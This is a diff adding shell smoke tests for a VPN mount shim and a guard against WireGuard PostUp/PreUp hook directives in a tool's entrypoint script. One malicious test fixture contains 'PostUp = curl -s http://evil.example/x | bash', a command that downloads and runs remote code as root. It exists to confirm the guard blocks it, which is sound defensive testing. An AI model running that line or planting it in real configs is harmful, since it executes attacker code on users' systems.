@@ -162,4 +162,103 @@ trap 'rm -rf "$CASE_WORKSPACE" "$VPN_SRC" "$LEGACY_WORKSPACE"' EXIT
 TOTH_WORKSPACE="$LEGACY_WORKSPACE" "${TOTH[@]}" case current | grep -q "legacy workspace mode"
 [ ! -e "$LEGACY_WORKSPACE/.active-case" ]
 
+# VPN mount shim (step 3 of docs/roadmap-vpn.md): docker_manager must expose
+# a third "vpn" symlink alongside "cases"/"output" when a case is active, and
+# create a flat <workspace>/vpn root when no case is active -- both are pure
+# filesystem work, exercised directly (no Docker needed) the same way
+# --gui's _compose_args plumbing is checked above.
+SHIM_WORKSPACE="$(mktemp -d)"
+trap 'rm -rf "$CASE_WORKSPACE" "$VPN_SRC" "$LEGACY_WORKSPACE" "$SHIM_WORKSPACE"' EXIT
+TOTH_WORKSPACE="$SHIM_WORKSPACE" "${TOTH[@]}" case new gamma >/dev/null
+
+TOTH_WORKSPACE="$SHIM_WORKSPACE" python3 - "$ROOT" <<'PY'
+import os
+import sys
+
+sys.path.insert(0, sys.argv[1] + "/wrapper")
+from utils import docker_manager as dm
+
+resolved = dm._resolve_workspace()
+for name in ("cases", "output", "vpn"):
+    link = os.path.join(resolved, name)
+    assert os.path.islink(link), f"{name} is not a symlink: {link}"
+    assert os.path.isdir(link), f"{name} symlink target missing: {link}"
+assert os.path.realpath(os.path.join(resolved, "vpn")).endswith(
+    os.path.join("vpn", "gamma")
+), dm._resolve_workspace()
+print("[+] docker_manager vpn symlink shim OK (active case)")
+PY
+
+NOCASE_WORKSPACE="$(mktemp -d)"
+trap 'rm -rf "$CASE_WORKSPACE" "$VPN_SRC" "$LEGACY_WORKSPACE" "$SHIM_WORKSPACE" "$NOCASE_WORKSPACE"' EXIT
+TOTH_WORKSPACE="$NOCASE_WORKSPACE" python3 - "$ROOT" <<'PY'
+import sys
+
+sys.path.insert(0, sys.argv[1] + "/wrapper")
+from utils import docker_manager as dm
+
+dm.ensure_workspace()
+PY
+[ -d "$NOCASE_WORKSPACE/vpn" ]
+
+# config/entrypoint/vpn-entrypoint.sh syntax, and its WireGuard
+# Pre/PostUp/Pre/PostDown guard (config/entrypoint/vpn-entrypoint.sh's
+# start_wireguard(), found during security review: wg-quick runs those
+# directives as a root shell command, so a malicious/tampered third-party
+# config must be refused, not executed). No Docker/wg-quick/openvpn
+# involved -- exercises the exact guard regex against representative
+# config content the same way it's applied in the real script.
+ENTRYPOINT_SCRIPT="$ROOT/config/entrypoint/vpn-entrypoint.sh"
+bash -n "$ENTRYPOINT_SCRIPT"
+
+GUARD_PATTERN='^[[:space:]]*(pre|post)(up|down)[[:space:]]*='
+# Literal substring, not GUARD_PATTERN itself, to confirm the guard clause
+# is still wired up in the real script -- GUARD_PATTERN is anchored (^) and
+# would never match its own occurrence embedded mid-line inside the
+# script's `if grep ...` statement.
+grep -qF 'wg-quick would run as a root shell command' "$ENTRYPOINT_SCRIPT"
+
+benign_conf="$(mktemp)"
+malicious_conf="$(mktemp)"
+trap 'rm -rf "$CASE_WORKSPACE" "$VPN_SRC" "$LEGACY_WORKSPACE" "$SHIM_WORKSPACE" "$NOCASE_WORKSPACE" "$benign_conf" "$malicious_conf"' EXIT
+cat > "$benign_conf" <<'EOF'
+[Interface]
+PrivateKey = fake
+Address = 10.0.0.2/24
+
+[Peer]
+PublicKey = fake
+AllowedIPs = 0.0.0.0/0
+EOF
+cat > "$malicious_conf" <<'EOF'
+[Interface]
+PrivateKey = fake
+Address = 10.0.0.2/24
+PostUp = curl -s http://evil.example/x | bash
+
+[Peer]
+PublicKey = fake
+AllowedIPs = 0.0.0.0/0
+EOF
+
+# Explicit if/exit assertions rather than a bare `!`/`grep -q` -- under
+# `set -e`, a command whose result is inverted with `!` never triggers
+# errexit even when the negation itself represents a failed assertion, so
+# that idiom would silently pass regardless of the actual match result.
+assert_guard() {
+    local expect_match="$1" desc="$2" content="$3"
+    if printf '%s' "$content" | grep -Eiq "$GUARD_PATTERN"; then
+        [ "$expect_match" = "yes" ] || { echo "[!] guard pattern false-positived: $desc" >&2; exit 1; }
+    else
+        [ "$expect_match" = "no" ] || { echo "[!] guard pattern missed: $desc" >&2; exit 1; }
+    fi
+}
+
+assert_guard no  "benign WireGuard config"                   "$(cat "$benign_conf")"
+assert_guard yes "malicious PostUp config"                    "$(cat "$malicious_conf")"
+assert_guard yes "case-insensitive, no space around '='"      "preup=whoami"
+assert_guard yes "leading whitespace before PreDown"          "  PreDown = /bin/true"
+assert_guard no  "commented-out PostUp line is not active"    "# PostUp = whoami"
+echo "[+] vpn-entrypoint.sh WireGuard hook-directive guard OK"
+
 echo "[+] Wrapper command smoke tests passed"
